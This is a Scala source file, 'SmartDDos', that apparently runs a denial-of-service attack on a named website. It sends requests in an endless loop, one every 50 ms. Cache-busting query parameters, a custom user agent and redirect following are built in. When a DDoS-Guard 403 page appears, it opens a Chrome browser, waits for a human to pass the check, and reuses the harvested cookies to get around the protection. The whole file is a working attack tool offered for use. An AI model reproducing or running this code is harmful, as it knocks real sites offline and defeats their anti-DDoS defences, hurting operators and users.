package hi

import akka.actor.ActorSystem
import akka.http.scaladsl.Http
import akka.http.scaladsl.model.{HttpRequest, HttpResponse, StatusCodes, headers}
import hi.Agents.getCustomClientAgent
import hi.Test.randomQueryParam
import org.openqa.selenium.chrome.ChromeDriver

import scala.collection.mutable
import scala.concurrent.{ExecutionContextExecutor, Future}

object SmartDDos {

  var agent = getCustomClientAgent

  var cookieMap = scala.collection.mutable.HashMap.empty[String, String]
  cookieMap += ("" -> "")

  def innerRequest(url: String, recursion: Boolean)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
    val str = randomQueryParam(url)

    Http().singleRequest(HttpRequest(uri = str).withHeaders(
      headers.RawHeader("Cache-Control", "no-cache"),
      headers.Cookie(cookieMap.map(i => (i._1, i._2)).toSeq:_*),
      headers.RawHeader("User-Agent", agent)
    )).flatMap {
      case HttpResponse(StatusCodes.OK, _, _, _) =>
        Future.successful {
          if (!recursion) {
            println(s"Аттака $str - ОК")
          } else {
            println(s"Аттака после редиректа $str")
          }
        }
      case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
        Future.successful {
          if (recursion) {
            println(s"too many redirects $url")
          } else {
            val link = headers.filter(ss => ss.name().equals("Location"))

            if (link.nonEmpty && link.head.value().startsWith("http") && link.head.value() != str) {
              innerRequest(link.head.value(), true)
            } else {
              println(s"error redirect $url")
            }
          }
        }

      case HttpResponse(StatusCodes.Forbidden, headers, _, _) =>
        Future.successful{
          println(s"Доступ запрещен - 403 для цели $url")
          println(s"Запрос новых куков...")

          if(headers.exists(p => p.name() == "Server" && p.value() == "ddos-guard")) {
            println(fetchCookies(url, cookieMap))

            innerRequest(url, recursion = true)
          }
        }
      case err =>
        sys.error(s"server is not responding: $err")
    }
  }

  implicit val webDriver: ChromeDriver = {
    System.setProperty("webdriver.chrome.driver", "chromedriver")
    System.setProperty("webdriver.chrome.silentOutput", "true")
    new ChromeDriver()
  }

  //download https://chromedriver.chromium.org/downloads
  //xattr -d com.apple.quarantine chromedriver
  def fetchCookies(url: String, cookieMap: mutable.HashMap[String, String]) = {
    webDriver.get(url)

    //ждать 20 с пока пользователь пройдет ручную проверку
    Thread.sleep(20000)

    webDriver.manage().getCookies.forEach{
      c =>
        cookieMap += (c.getName -> c.getValue)
    }
  }

  val target = "https://xaknet.team/"

  def main(args: Array[String]): Unit = {
    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher

    println(fetchCookies(target, cookieMap))

    while (true) {
      innerRequest(target, false)
      Thread.sleep(50)
    }
  }
}
